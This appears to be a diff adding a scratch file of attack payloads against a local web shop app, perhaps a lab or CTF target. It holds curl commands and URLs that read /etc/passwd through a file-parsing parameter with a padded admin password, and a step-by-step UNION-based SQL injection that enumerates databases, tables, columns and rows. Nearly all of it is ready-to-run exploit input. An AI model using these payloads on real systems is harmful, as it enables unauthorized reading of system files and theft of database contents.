@@ -1,0 +1,44 @@
+http://127.0.0.1:8080/login.html?username=admin&password=adminnimda&menu=parsefile&param=/etc/passwd
+
+login.html?username=admin&password=adminnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnimda&para=/etc/passwd&menu=parsefile
+
+
+GET /%s HTTP/1.1\r\n
+Host: 127.0.0.1\r\n
+User-Agent: ComputerVendor\r\n
+Cookie: nilnilnilnil\r\n
+Connection: close\r\n
+Identity: unknown\r\n
+
+
+
+curl 'http://127.0.0.1:8080/login.html?username=admin&password=adminnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnimda&menu=parsefile&para=/etc/passwd' -H 'Credentials: LG GRAM' --output 
+
+
+login.html?username=admin&password=adminnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnimda&menu=parsefile&para=/etc/passwd HTTP/1.1\r\nCredentials: LG GRAM\r\nLilac: 
+
+
+CREATE TABLE `cargo` (
+  `cargo_id` int(11) NOT NULL AUTO_INCREMENT,
+  `name` varchar(128) NOT NULL,
+  PRIMARY KEY (`cargo_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
+
+
+insert into cargo (`name`) values ("admin");
+insert into cargo (`name`) values ("admin");
+
+
+curl -X POST "http://127.0.0.1:8080/cart.html?cargo=2&" -d "1=2&cargo=1),2,3,4,(1&"
+
+
+# Detect sql injection
+curl -X POST "http://127.0.0.1:8080/product.html" -d "a=b&id=1'&c=d"
+# Fetch all databases
+curl -X POST "http://127.0.0.1:8080/product.html" -d "a=b&id=1 union select concat(schema_name,char(9)),0 from information_schema.schemata&c=d"
+# Fetch tables of `shop` database
+curl -X POST "http://127.0.0.1:8080/product.html" -d "a=b&id=1 union select concat(table_name,char(9),table_schema,char(9)),char(10) from information_schema.tables where table_schema like 'shop'&c=d"
+# Fetch columns
+curl -X POST "http://127.0.0.1:8080/product.html" -d "a=b&id=1 union select concat(column_name,char(9)),char(10) from information_schema.columns where table_name like 'cargo'&c=d"
+# Fetch data
+curl -X POST "http://127.0.0.1:8080/product.html" -d "a=b&id=1 union select concat(cargo_id,char(9),name,char(9)),char(10) from cargo&c=d"
